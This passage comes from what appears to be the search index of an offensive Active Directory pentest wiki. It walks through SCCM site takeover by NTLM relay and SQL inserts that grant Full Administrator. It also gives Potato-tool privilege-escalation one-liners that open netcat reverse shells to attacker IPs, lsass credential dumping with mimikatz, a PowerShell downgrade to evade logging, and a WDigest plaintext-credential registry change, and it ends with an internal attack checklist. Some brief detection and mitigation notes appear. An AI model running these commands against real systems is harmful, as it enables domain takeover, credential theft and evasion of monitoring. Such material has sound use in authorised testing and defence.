the results, we can use the <code>-debug</code> option during the command execution or use <code>show -all</code> after we execute the command:</p> <pre><code>python3 sccmhunter.py show -all\n</code></pre> <p>Additionally, we can utilize the <code>smb</code> module to profile and list SMB shares of identified SCCM servers.</p> <ol> <li> <p>Profiling the site server:</p> <ul> <li>Validates connectivity.</li> <li>Verifies if the site server hosts the MSSQL service.</li> <li>Determines if the site server is active or passive.</li> <li>Identify whether the site server is a central administration site.</li> </ul> </li> <li> <p>Management point verifications.</p> <ul> <li>Validates connectivity to the HTTP endpoints.</li> </ul> </li> <li> <p>Checks for roles and configurations.</p> <ul> <li>Searches for associated site codes from default file shares.</li> <li>Verify whether the SMB signing is turned off.</li> <li>Identifies the site system roles such as Site Server, Management Point, Distribution Point, SMS Provider, MSSQL, and WSUS.</li> </ul> </li> </ol> <p>Search for PXEBoot variables and save them:</p> <pre><code>python3 sccmhunter.py smb -u &lt;user&gt; -p &lt;pass&gt; -d domain.local -dc-ip &lt;dc-ip&gt; -save\n</code></pre> <p>Additionally, the SharpSCCM (C#) tool can also be utilized on Windows systems and it provides features for enumeration, credential gathering and lateral movement without requring access to the SCCM administration console.</p>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#execution","title":"Execution","text":"<p>Step 1: Set up NTLM Relay</p> <p>Use <code>ntlmrelayx.py</code> to listen for incoming connections and relay them to the target MSSQL server. The <code>-socks</code> flag creates a proxy session upon successful relay.</p> <pre><code>impacket-ntlmrelayx -t \"mssql://&lt;MSSQL_SERVER_IP&gt;\" -smb2support -socks\n</code></pre> <p>Step 2: Coerce Authentication</p> <p>PetitPotam: <pre><code>python3 PetitPotam.py -u &lt;user&gt; -p '&lt;password&gt;' -d &lt;domain&gt; &lt;ATTACKER_IP&gt; &lt;PRIMARY_SITE_SERVER_IP&gt;\n</code></pre></p> <p>Attempt various methods: (coercer)</p> <pre><code>python3 coercer.py coerce -l &lt;attackerIP&gt; -t &lt;targetIP&gt; -u 'user' -p 'pass' -d &lt;domain.local&gt; -v\n</code></pre> <p>Step 3: Access the Database via Relayed Session</p> <p>Use the created SOCKS proxy with proxychains and mssqlclient.py to connect to the database as the relayed machine account.</p> <pre><code>proxychains4 -q python3 mssqlclient.py 'DOMAIN/PRIMARY_SITE_SERVER_NAME$'@&lt;MSSQL_SERVER_IP&gt; -windows-auth -no-pass\n</code></pre> <p>Step 4: Grant Admin Privileges in the Database</p> <p>Execute a series of SQL queries to add an attacker-controlled user (e.g., LAB\\User) as a Full Administrator.</p> <p>Get SID</p> <pre><code>Get-DomainUser &lt;User&gt; -Properties objectsid\n</code></pre> <p>Convert to binary</p> <pre><code>function Convert-StringSidToBinary {\n    param ([string]$StringSid)\n    $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid\n    $binarySid = New-Object byte[] ($sid.BinaryLength)\n    $sid.GetBinaryForm($binarySid, 0)\n    $binarySidHex = ($binarySid | ForEach-Object { $_.ToString(\"X2\") }) -join ''\n    echo \"0x$($binarySidHex.ToLower())\"\n}\n\nConvert-StringSidToBinary \"&lt;SID&gt;\"\n</code></pre> <p>Add user into admins table</p> <pre><code>USE CM_&lt;SiteCode&gt;;\nINSERT INTO RBAC_Admins (AdminSID, LogonName, IsGroup, IsDeleted, SourceSite) VALUES (&lt;hex of convertedsid&gt;, 'LAB\\User', 0, 0, '&lt;SiteCode&gt;');\n</code></pre> <p>Retrieve the new adminID</p> <pre><code>SELECT AdminID, LogonName FROM RBAC_Admins;\n</code></pre> <p>Assign <code>Full Administrator</code> to yourself</p> <pre><code>INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (&lt;new_admin_id&gt;, 'SMS0001R', 'SMS00ALL', '29');\nINSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (&lt;new_admin_id&gt;, 'SMS0001R', 'SMS00001', '1');\nINSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (&lt;new_admin_id&gt;, 'SMS0001R', 'SMS00004', '1');\n</code></pre>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#cleanup-considerations","title":"Cleanup Considerations","text":"<ul> <li>Remove the user from SCCM Full Administrator upon completion of engagement</li> </ul>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#detection","title":"Detection","text":"<ul> <li> <p>Monitor for authentication coercion attempts against high-value servers (e.g., unexpected EFS RPC traffic).</p> </li> <li> <p>Alert when machine accounts authenticate from IPs other than their own, which is indicative of a relay attack.</p> </li> <li> <p>Implement database auditing to monitor for direct, unauthorized modifications to <code>RBAC_Admins</code> and <code>RBAC_ExtendedPermissions</code> tables.</p> </li> <li> <p>Regularly audit the list of SCCM Full Administrators for unauthorized additions.</p> </li> </ul>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Domain/SCCM/SCCM%20Site%20Takeover%20I/#mitigation","title":"Mitigation","text":"<ul> <li> <p>Enable EPA: Enable Extended Protection for Authentication on the MSSQL service to cryptographically bind the service to the TLS session, mitigating relay attacks.</p> </li> <li> <p>Co-locate Roles: Install the SCCM database on the Primary Site Server itself. This eliminates the need for the server's machine account to have admin rights on a separate database server.</p> </li> <li> <p>Patch Systems: Apply security updates that mitigate NTLM coercion vulnerabilities like PetitPotam.</p> </li> </ul>","tags":["type/technique","tactic/TA0008","tactic/TA0006","technique/T1557001","stage/lateral-movement","os/windows","tool/impacket","tool/ntlmrelayx","tool/petitpotam","tool/mssqlclient","stage/privilege-escalation"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Local/Token%20Privileges/","title":"Token Privileges","text":"","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Local/Token%20Privileges/#identify","title":"identify","text":"<p><pre><code>whoami /priv\n</code></pre> Or sysinternals</p> <p>https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk <pre><code>accesschk.exe -p\n</code></pre></p>","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Local/Token%20Privileges/#exploit","title":"Exploit","text":"","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Local/Token%20Privileges/#seimpersonate-seassignprimarytoken","title":"SeImpersonate &amp; SeAssignPrimaryToken","text":"<p>Windows Server 2016 and under:  JuicyPotato https://github.com/ohpe/juicy-potato <pre><code>JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.15.119 5555 -e cmd.exe\" -t *\n</code></pre> Windows Server 2019 and on: PrintSpoofer: https://github.com/itm4n/PrintSpoofer Spawn shell over new process need stable shell <pre><code>PrintSpoofer.exe -i -c cmd.exe\n</code></pre> Spawn revshell <pre><code>PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\"\n</code></pre> RoguePotato: https://github.com/antonioCoco/RoguePotato <pre><code>RoguePotato.exe -r &lt;IP&gt; -e \"C:\\Windows\\Tasks\\nc.exe &lt;IP&gt; &lt;port&gt; -e cmd.exe\" -l 9999\n</code></pre> SweetPotato: https://github.com/CCob/SweetPotato <pre><code>SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"-w hidden -enc &lt;ENCODED REVSHELL&gt;\"\n</code></pre> OR <pre><code>SweetPotato.exe -e EfsRpc -p c:\\Users\\Public\\nc.exe -a \"10.10.10.10 1234 -e cmd\"\n</code></pre> GodPotato: https://github.com/BeichenDream/GodPotato <pre><code>GodPotato.exe -cmd \"cmd /c whoami\"\n</code></pre> <pre><code>GodPotato -cmd \"nc -t -e C:\\Windows\\System32\\cmd.exe 192.168.1.102 2012\"\n</code></pre></p>","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"Active%20Directory/5.%20Privilege%20Escalation/Local/Token%20Privileges/#sedebug","title":"SeDebug","text":"<p>Dumping lsass</p> <p><pre><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp\n</code></pre> or with task manager </p> <p>read with mimikatz or pypykatz</p> <pre><code>mimikatz # sekurlsa::minidump lsass.dmp\nmimikatz # sekurlsa::logonpasswords\n</code></pre> <pre><code>pypykatz lsa minidump lsass.dmp\n</code></pre> <p>Elevating to SYSTEM</p> <p>https://github.com/decoder-it/psgetsystem</p> <p>Using psgetsystem we can launch a child process that inherits the token of the parent process.</p> <pre><code>PS C:\\tools&gt; tasklist \n\nImage Name                     PID Session Name        Session#    Mem Usage\n========================= ======== ================ =========== ============\nSystem Idle Process              0 Services                   0          4 K\nSystem                           4 Services                   0        116 K\nsmss.exe                       340 Services                   0      1,212 K\ncsrss.exe                      444 Services                   0      4,696 K\nwininit.exe                    548 Services                   0      5,240 K\ncsrss.exe                      556 Console                    1      5,972 K\nwinlogon.exe                   612 Console                    1     10,408 K\n</code></pre> <p>We can target the <code>winlogon.exe</code> service because its running as SYSTEM.</p> <p>We can either 1. launch cmd.exe as SYSTEM if we have GUI access or 2. execute an exe to get a reverse shell, add ourselves to a group, or anything else.</p> <pre><code>import-module .\\psgetsys.ps1\nImpersonateFromParentPid -ppid 612 -command C:\\Windows\\Tasks\\elev.exe\n</code></pre> <p>that process will launch with the integrity of the parent. (Hopefully SYSTEM)</p>","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"Active%20Directory/6.%20Defense%20Evasion/Powershell%20Downgrade/","title":"Powershell Downgrade","text":"<p>Powershell event logging was introduced as a feature with Powershell 3.0 and forward. We can attempt to enable Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. <pre><code>powershell.exe -version 2\n</code></pre></p>"},{"location":"Active%20Directory/Miscellaneous/Disable%20Restricted%20Admin%20Mode/","title":"Disable Restricted Admin Mode","text":"<p>To RDP with a hash, you must enable restricted admin mode via registry <pre><code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n</code></pre></p>"},{"location":"Active%20Directory/Miscellaneous/Enable%20plaintext%20wdigest/","title":"Enable plaintext wdigest","text":"<p>run powershell with admin rights <pre><code>reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1\n</code></pre> <pre><code>gpupdate /force\n</code></pre> Reboot box</p>","tags":["AD"]},{"location":"Active%20Directory/Miscellaneous/MachineAccountQuota/","title":"MachineAccountQuota","text":"<p>Default is 10 for domain users, this makes RBCD and kerberos relay attacks significantly easier to exploit and is worth reporting.</p>"},{"location":"Active%20Directory/Miscellaneous/MachineAccountQuota/#identify","title":"Identify","text":"<p>with nxc <pre><code>nxc ldap &lt;ip&gt; -u user -p pass -M maq\n</code></pre></p> <p>with powerview <pre><code>Get-DomainPolcy -Policy DC -domain &lt;domain&gt; | Select-Object -ExpandProperty PrivilegeRights | select seMachineAccountPrivilege\nConverFrom-SID &lt;SID&gt;\n</code></pre></p> <p>with powershell <pre><code>Get-ADObject ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota\n</code></pre></p> <p>ldapsearch</p> <pre><code>ldapsearch -x -H ldap://&lt;dcip&gt; -b \"DC=example,DC=local\" ms-DS-MachineAccountQuota\n</code></pre>"},{"location":"Active%20Directory/Miscellaneous/MachineAccountQuota/#what-now","title":"What now?","text":"<ul> <li>Resource-Based Constrained Delegation</li> </ul>"},{"location":"Active%20Directory/flat/","title":"Internal Checklist","text":"","tags":["#type/checklist","#assessment/report","#os/windows","#service/active-directory"]},{"location":"Active%20Directory/flat/#unauthenticated-checks","title":"Unauthenticated Checks","text":"<ul> <li>[ ] Network Scanning</li> <li>Perform comprehensive port scanning</li> <li>Identify services running on the </li> <li> <p>Map out domain infrastructure</p> </li> <li> <p>[ ] LLMNR/NBT-NS/mDNS Poisoning</p> </li> <li>Check if LLMNR/NBT-NS/mDNS are enabled and can be poisoned</li> <li>Capture NTLMv2 hashes from broadcast name resolution</li> <li> <p>Link: [[llmnr_poisoning]]</p> </li> <li> <p>[ ] SMB Signing Check</p> </li> <li>Identify hosts with SMB signing disabled or not required</li> <li>Potential for NTLM relay attacks</li> <li> <p>Link: [[smb_signing]]</p> </li> <li> <p>[ ] IPv6 Attack Surface</p> </li> <li>Check for IPv6 enabled networks with no IPv6 DNS server</li> <li>Potential for IPv6 DNS takeover</li> <li> <p>Link: [[ipv6_attacks]]</p> </li> <li> <p>[ ] Null Session Enumeration</p> </li> <li>Check for null session access to systems</li> <li>Enumerate shares, users, groups without authentication</li> <li> <p>Link: [[null_session]]</p> </li> <li> <p>[ ] Anonymous LDAP Binds</p> </li> <li>Test for anonymous LDAP binding</li> <li>Enumerate domain information without credentials</li> <li> <p>Link: [[() ldap_techniques]]</p> </li> <li> <p>[ ] Relay Attack Opportunities</p> </li> <li>Identify services vulnerable to NTLM relay</li> <li>Check WebDAV, HTTP endpoints, ADCS Web Enrollment</li> <li> <p>Link: [[relay_attacks]]</p> </li> <li> <p>[ ] Pre-Windows 2000 Compatibility</p> </li> <li>Check for \"Everyone\" permissions due to pre-Windows 2000 compatibility</li> <li> <p>Link: [[pre_windows_2000_computers]]</p> </li> <li> <p>[ ] NFS Shares</p> </li> <li>Identify open NFS exports</li> <li>Check for no_root_squash misconfigurations</li> <li>Look for sensitive data accessible via NFS</li> <li> <p>Link: [[nfs]]</p> </li> <li> <p>[ ] Password Spraying Opportunities</p> </li> <li>Test common/weak passwords against found usernames</li> <li>Avoid account lockouts by tracking attempts</li> <li> <p>Link: [[() password_spraying]]</p> </li> <li> <p>[ ] LDAP Passback Opportunities</p> </li> <li>Printers &amp; Networked phones</li> <li>Link: [[cisco_phones]], [[ldap_passback]]</li> </ul>","tags":["#type/checklist","#assessment/report","#os/windows","#service/active-directory"]},{"location":"Active%20Directory/flat/#low-privilege-checks","title":"Low-Privilege Checks","text":"<ul> <li>[ ] Password Policy</li> <li>Evaluate domain password policy strength</li> <li>Check for fine-grained password policies</li> <li> <p>Link: [[- password_policy_enumeration]]</p> </li> <li> <p>[ ] Kerberoasting</p> </li> <li>Find service accounts with SPN records</li> <li>Extract and crack service account TGS tickets</li> <li> <p>Link: [[kerberoasting]]</p> </li> <li> <p>[ ] AS-REP Roasting</p> </li> <li>Identify accounts with Kerberos pre-authentication disabled</li> <li>Request and crack AS-REP encryption</li> <li> <p>Link: [[asreproast]]</p> </li> <li> <p>[ ] Group Policy Preference Passwords</p> </li> <li>Search for encrypted passwords in Group Policy Preferences</li> <li>Decrypt cPassword attributes in GPP files</li> <li> <p>Link: [[gpp_password]]</p> </li> <li> <p>[ ] BloodHound Analysis</p> </li> <li>Collect domain information using SharpHound or similar</li> <li>Analyze privilege escalation paths</li> <li> <p>Link: [[bloodhound]]</p> </li> <li> <p>[ ] Accessible File Shares</p> </li> <li>Enumerate readable shares across the domain</li> <li>Look for sensitive files, configuration data, credentials</li> <li>Check for overly permissive share permissions</li> <li> <p>Link: [[Internal/data_pillaging]]</p> </li> <li> <p>[ ] Data Pillaging</p> </li> <li>passwords, pii, phi, tokens, keys, etc...</li> <li>Check user home directories and departmental shares</li> <li> <p>Link: [[Internal/data_pillaging]]</p> </li> <li> <p>[ ] SYSVOL Enumeration</p> </li> <li>Check readable files in the SYSVOL share</li> <li>Look for scripts, configuration files with credentials</li> <li> <p>Link: [[() active_directory_enumeration]]</p> </li> <li> <p>[ ] DNS Dump</p> </li> <li>Extract DNS records from the domain</li> <li>Map internal network structure</li> <li>Identify potential targets</li> <li> <p>Link: [[dns_dump]]</p> </li> <li> <p>[ ] Domain Wide Enumeration</p> </li> <li>Comprehensive enumeration of domain objects</li> <li>Map out users, groups, computers, and relationships</li> <li>Identify misconfigurations and security issues</li> <li> <p>Link: [[domain_wide_enumeration]]</p> </li> <li> <p>[ ] LDAP Enumeration for Sensitive Info</p> </li> <li>Search for passwords/sensitive data in LDAP attributes</li> <li>Check description fields, info fields, and comments</li> <li> <p>Link: [[() ldap_techniques]]</p> </li> <li> <p>[ ] Local Admin Access Check</p> </li> <li>Identify machines where current user has local admin</li> <li>Potential lateral movement points</li> <li> <p>Link: [[() active_directory_enumeration]]</p> </li> <li> <p>[ ] Machine Account Quota Abuse</p> </li> <li>Check if current user can create computer accounts (default=10)</li> <li>Potential for resource-based constrained delegation attacks</li> <li> <p>Link: [[machine_account_quota]]</p> </li> <li> <p>[ ] Print Spooler Service</p> </li> <li>Check for systems with Print Spooler enabled</li> <li>Potential for PrintNightmare or other printer exploits</li> <li> <p>Link: [[() printnightmare]]</p> </li> <li> <p>[ ] Authentication Coercion Points</p> </li> <li>Identify services that can be coerced to authenticate</li> <li>Check for PrinterBug, PetitPotam, ShadowCoerce opportunities</li> <li>Force domain admin authentication via print spooler or EFS-RPC</li> <li>Check for DVCSync exploitation</li> <li>OPSEC Suggestions: Monitor for anomalous network traffic during coercion; use low-frequency attempts to avoid detection</li> <li>Link: [[authentication_coercion]]</li> </ul>","tags":["#type/checklist","#assessment/report","#os/windows","#service/active-directory"]},{"location":"Active%20Directory/flat/#stage-3-local-admin-service-account-checks","title":"Stage 3: Local Admin / Service Account Checks","text":"<ul> <li>[ ] Credential Harvesting</li> <li>Extract credentials from LSASS memory</li> <li>Find stored credentials in registry/files</li> <li> <p>Link: [[credential_dumping]]</p> </li> <li> <p>[ ] NTLM Hash Extraction</p> </li> <li>Extract NTLM hashes from SAM database</li> <li>Look for password reuse across systems</li> <li> <p>Link: [[ntlm_hash_theft]]</p> </li> <li> <p>[ ] Credential Manager / DPAPI</p> </li> <li>Extract saved credentials from Windows Credential Manager</li> <li>Decrypt DPAPI blobs for stored credentials</li> <li> <p>Link: [[credential_dumping]]</p> </li> <li> <p>[ ] Token Impersonation</p> </li> <li>Check for impersonation privileges</li> <li>Look for tokens of privileged users on compromised systems</li> <li> <p>Link: [[() token_impersonation]]</p> </li> <li> <p>[ ] Local Privilege Escalation</p> </li> <li>Check for misconfigurations enabling local privilege escalation</li> <li>Vulnerable services, DLL hijacking, unquoted paths</li> <li> <p>Link: [[() windows_priv_esc]] [[unquoted_service_path]]</p> </li> <li> <p>[ ] Scheduled Tasks &amp; Services</p> </li> <li>Analyze scheduled tasks and services for privilege escalation</li> <li>Check for hardcoded credentials or weak permissions</li> <li> <p>Link: [[() windows_priv_esc]]</p> </li> <li> <p>[ ] Sensitive Registry Keys</p> </li> <li>Check registry for stored credentials</li> <li>Look for autologon passwords, service credentials</li> <li> <p>Link: [[() windows_priv_esc]]</p> </li> <li> <p>[ ] Browser Data</p> </li> <li>Extract saved passwords from browsers</li> <li>Look for domain credentials in browser storage</li> <li> <p>Link: [[credential_dumping]]</p> </li> <li> <p>[ ] Lateral Movement Opportunities</p> </li> <li>Identify potential lateral movement techniques</li> <li>Use collected credentials on other systems</li> <li> <p>Link: [[pass_the_hash]] [[overpass_the_hash]] [[pass_the_ticket]]</p> </li> <li> <p>[ ] LAPS Implementation Check</p> </li> <li>Verify LAPS implementation and security</li> <li>Check who can read LAPS passwords</li> <li> <p>Link: [[() laps_abuse]]</p> </li> <li> <p>[ ] Group Managed Service Accounts</p> </li> <li>Check for gMSA misconfigurations</li> <li>Identify which principals can retrieve gMSA passwords</li> <li> <p>Link: [[() active_directory_enumeration]]</p> </li> <li> <p>[ ] MSSQL Server Instances</p> </li> <li>Identify SQL Servers accessible with current credentials</li> <li>Check for linked servers, command execution capabilities</li> <li>Link: [[mssql_abuse]]</li> </ul>","tags":["#type/checklist","#assessment/report","#os/windows","#service/active-directory"]},{"location":"Active%20Directory/flat/#stage-4-domain-privilege-escalation-checks","title":"Stage 4: Domain Privilege Escalation Checks","text":"<ul> <li>[ ] Privileged Group Membership</li> <li>Analyze membership in privileged groups</li> <li>Look for nested group memberships granting excessive privileges</li> <li> <p>Link: [[group_membership]]</p> </li> <li> <p>[ ] Kerberos Delegation</p> </li> <li>Check for unconstrained delegation</li> <li>Check for constrained delegation misconfigurations</li> <li>Check for resource-based constrained delegation issues</li> <li> <p>Link: [[kerberos_delegation]]</p> </li> <li> <p>[ ] ACL Misconfigurations</p> </li> <li>Identify dangerous permissions on AD objects</li> <li>Look for WriteDACL, WriteOwner, GenericAll rights</li> <li> <p>Link:  [[- domain_acls]]</p> </li> <li> <p>[ ] Shadow Credentials Attack</p> </li> <li>Check for ability to modify msDS-KeyCredentialLink attribute</li> <li>Potential for certificate-based authentication attacks</li> <li> <p>Link: [[- shadow_credentials]]</p> </li> <li> <p>[ ] ADCS Vulnerabilities</p> </li> <li>Check for misconfigured certificate templates</li> <li>Look for ESC1-ESC8 vulnerabilities</li> <li> <p>Link: [[adcs_vulnerabilities]] </p> </li> <li> <p>[ ] Domain Trust Relationships</p> </li> <li>Analyze domain and forest trusts</li> <li>Check for transitive trust relationships that can be abused</li> <li> <p>Link: [[() forest_domain_trusts]]</p> </li> <li> <p>[ ] Exchange Server Privileges</p> </li> <li>Check for Exchange server privileges that can be abused</li> <li>Look for excessive permissions granted to Exchange servers</li> <li> <p>Link: [[group_membership]]</p> </li> <li> <p>[ ] SCCM Misconfigurations</p> </li> <li>Assess SCCM deployment security</li> <li>Check for privileges that can be leveraged for code execution</li> <li> <p>Link: [[sccm_site_takeover]] </p> </li> <li> <p>[ ] Windows Defender / AV Exclusions</p> </li> <li>Check for excessive exclusions in antivirus settings</li> <li>Look for excluded paths that could be used for persistence</li> <li>Link: [[() active_directory_enumeration]]</li> </ul>","tags":["#type/checklist","#assessment/report","#os/windows","#service/active-directory"]},{"location":"Active%20Directory/flat/#stage-5-domain-admin-enterprise-admin-checks","title":"Stage 5: Domain Admin / Enterprise Admin Checks","text":"<ul> <li>[ ] DCSync Rights</li> <li>Identify accounts with DCSync capabilities</li> <li>Check for GetChanges/GetChangesAll rights to domain objects</li> <li> <p>Link: [[dcsync]]</p> </li> <li> <p>[ ] AdminSDHolder Issues</p> </li> <li>Check for modifications to AdminSDHolder container</li> <li>Look for backdoor permissions</li> <li> <p>Link: [[() active_directory_enumeration]]</p> </li> <li> <p>[ ] krbtgt Account</p> </li> <li>Check krbtgt password rotation practices</li> <li>Potential for Golden Ticket attacks</li> <li> <p>Link: [[golden_ticket]]</p> </li> <li> <p>[ ] Group Policy Object Security</p> </li> <li>Analyze GPO permissions and settings</li> <li>Look for overly permissive ACLs on GPOs</li> <li> <p>Link: [[group_policy_abuse]]</p> </li> <li> <p>[ ] Domain Controller Security</p> </li> <li>Review domain controller security settings</li> <li>Check for unnecessary roles/features installed</li> <li> <p>Link: [[() active_directory_enumeration]]</p> </li> <li> <p>[ ] AD Backup Security</p> </li> <li>Check for insecure AD backups</li> <li>Look for accessible NTDS.dit files</li> <li> <p>Link: [[() active_directory_enumeration]]</p> </li> <li> <p>[ ] Tier Zero Asset Inventory</p> </li> <li>Verify inventory of all Tier Zero assets</li> <li>Look for undocumented domain controllers or admin workstations</li> <li> <p>Link: [[() active_directory_enumeration]]</p> </li> <li> <p>[ ] AD Recycle Bin Access</p> </li> <li>Check who has access to recover deleted objects</li> <li>Potential for restoring backdoor accounts</li> <li> <p>Link: [[() active_directory_enumeration]]</p> </li> <li> <p>[ ] AD Database Mounting</p> </li> <li>Check for ability to mount copies of AD database</li> <li>Potential offline credential extraction</li> <li> <p>Link: [[credential_dumping]]</p> </li> <li> <p>[ ] Domain Controller LSASS Protection</p> </li> <li>Check if credential guard or other LSASS protections are enabled</li> <li>Verify if LSASS runs as a protected process</li> <li>Link: [[credential_dumping]]</li> </ul>","tags":["#type/checklist","#assessment/report","#os/windows","#service/active-directory"]},{"location":"Active%20Directory/flat/#additional-checks","title":"Additional Checks","text":"<ul> <li>[ ] Pre-Boot Execution Environment (PXE)</li> <li>Check for insecure PXE boot configurations</li> <li>Look for opportunities to intercept boot images</li> <li> <p>Link: [[pre_boot_execution_environment_pxe]]</p> </li> <li> <p>[ ] ZeroLogon</p> </li> <li>Test for CVE-2020-1472 vulnerability</li> <li>Check if domain controllers are patched</li> <li> <p>Link: [[zerologon]]</p> </li> <li> <p>[ ] NoPac (SamAccountName Spoofing)</p> </li> <li>Test for CVE-2021-42278/CVE-2021-42287 vulnerabilities</li> <li>Check for potential domain privilege escalation</li> <li> <p>Link: [[nopac_samaccountname_spoofing]]</p> </li> <li> <p>[ ] Alternate Service Name Attacks</p> </li> <li>Look for vulnerable service configurations</li> <li>Check for potential authentication bypass</li> <li> <p>Link: [[- alternate_service_name]]</p> </li> <li> <p>[ ] Default Credentials</p> </li> <li>Check systems for default/unchanged credentials</li> <li>Test known default username/password combinations</li> <li> <p>Link: [[() default_credentials]]</p> </li> <li> <p>[ ] IPMI Hash Dump</p> </li> <li>Identify IPMI interfaces</li> <li>Attempt to extract password hashes</li> <li> <p>Link: [[ipmi_hash_dump]]</p> </li> <li> <p>[ ] Cisco Smart Install</p> </li> <li>Identify Cisco devices with Smart Install enabled</li> <li>Check for potential configuration extraction or modification</li> <li>Link: [[cisco_smart_install]]</li> </ul>","tags":["#type/checklist","#assessment/report","#os/windows","#service/active-directory"]},{"location":"Active%20Directory/flat/%28%29%20active_directory_enumeration/","title":"() active directory enumeration","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/ldap","#protocol/smb","#tool/netexec","#tool/bloodhound","#tool/adexplorer","#tool/powerview"]},{"location":"Active%20Directory/flat/%28%29%20active_directory_enumeration/#technique","title":"Technique","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/ldap","#protocol/smb","#tool/netexec","#tool/bloodhound","#tool/adexplorer","#tool/powerview"]},{"location":"Active%20Directory/flat/%28%29%20active_directory_enumeration/#prerequisites","title":"Prerequisites","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/ldap","#protocol/smb","#tool/netexec","#tool/bloodhound","#tool/adexplorer","#tool/powerview"]},{"location":"Active%20Directory/flat/%28%29%20active_directory_enumeration/#execution","title":"Execution","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/ldap","#protocol/smb","#tool/netexec","#tool/bloodhound","#tool/adexplorer","#tool/powerview"]},{"location":"Active%20Directory/flat/%28%29%20active_directory_enumeration/#detection-mitigation","title":"Detection &amp; Mitigation","text":"","tags":["#type/technique","#tactic/TA0007","#technique/T1087","#stage/reconnaissance","#os/windows","#protocol/ldap","#protocol/smb","#tool/netexec","#tool/bloodhound","#tool/adexplorer","#tool/powerview"]},{"location":"Active%20Directory/flat/%28%29%20forest_domain_trusts/","title":"() forest domain 